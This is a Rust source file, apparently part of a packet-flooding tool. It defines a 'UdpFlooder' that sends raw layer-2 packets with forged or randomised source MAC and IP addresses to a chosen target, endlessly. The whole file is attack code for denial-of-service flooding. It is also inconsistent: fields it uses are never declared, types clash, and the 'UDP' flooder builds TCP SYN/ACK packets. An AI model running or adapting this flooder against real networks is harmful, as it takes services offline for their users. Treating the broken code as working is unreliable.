use std::{net::Ipv4Addr};
use crate::engines::UdpArgs;
use crate::iface::IfaceInfo;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::{abort, inline_display, parse_mac};



pub struct UdpFlooder {
    args:      UdpArgs,
    iface:     String,
    pkts_sent: usize,
}

#[derive(Default)]
struct PacketData {
    src_ip:  Ipv4Addr,
    src_mac: [u8; 6],
    dst_ip:  Ipv4Addr,
    dst_mac: [u8; 6],
}


impl UdpFlooder {

    pub fn new(args: UdpArgs) -> Self {
        Self {
            iface:     IfaceInfo::default_iface(),
            pkts_sent: 0,
            pkt_data:  Default::default(),     
            args,
        }
    }



    pub fn execute(&mut self){
        self.set_pkt_data();
        self.display_pkt_data();
        self.send_endlessly();
    }



    fn set_pkt_data(&mut self) {
        self.pkt_data.src_ip   = self.args.src_ip;
        self.pkt_data.src_mac  = self.resolve_mac(self.args.src_mac.clone());
        self.pkt_data.dst_port = self.args.port;
        self.pkt_data.dst_ip   = self.args.target_ip;
        self.pkt_data.dst_mac  = self.resolve_mac(Some(self.args.target_mac.clone())).unwrap();
        self.pkt_data.flag     = if self.args.ack {"ack".to_string()} else {"syn".to_string()};
    }



    fn resolve_mac(&self, input_mac: Option<String>) -> Option<[u8; 6]> {
        if input_mac.is_none() {
            return None;
        }

        let mac = input_mac.unwrap();

        let mac_to_parse = match mac.as_str() {
            "gateway" => IfaceInfo::gateway_mac(&self.iface).unwrap().to_string(),
            "local"   => IfaceInfo::get_mac(&self.iface),
            _         => mac
        };

        match parse_mac(&mac_to_parse) {
            Err(e)  => { abort(e) },
            Ok(mac) => { Some(mac) },    
        }
    }


    
    fn display_pkt_data(&self) {
        let src_mac = match self.pkt_data.src_mac {
            Some(mac) => Self::format_mac(mac),
            None      => "Random".to_string(),
        };

        let src_ip = match self.pkt_data.src_ip {
            Some(ip) => ip.to_string(),
            None     => "Random".to_string(),
        };

        println!("SRC >> MAC: {}  IP: {}", src_mac, src_ip);
        println!("DST >> MAC: {}  IP: {}", Self::format_mac(self.pkt_data.dst_mac), self.pkt_data.dst_ip);
        println!("IFACE: {}", self.iface);
    }



    fn format_mac(mac: [u8; 6]) -> String {
        format!(
            "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
        )
    }



    fn send_endlessly(&mut self) {
        let socket = Layer2RawSocket::new(&self.iface);

        loop {
            let pkt = self.get_pkt();
            socket.send(pkt);

            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
    }


    
    #[inline]
    fn get_pkt(&mut self) -> &[u8] {
        self.builder.tcp_ether(
            self.pkt_data.src_mac.unwrap_or_else(|| self.rng.get_random_mac()), 
            self.pkt_data.src_ip.unwrap_or_else( || self.rng.get_random_ip()), 
            self.rng.get_random_port(),
            self.pkt_data.dst_mac, 
            self.pkt_data.dst_ip,
            self.pkt_data.dst_port,
            &self.pkt_data.flag
        )
    }

}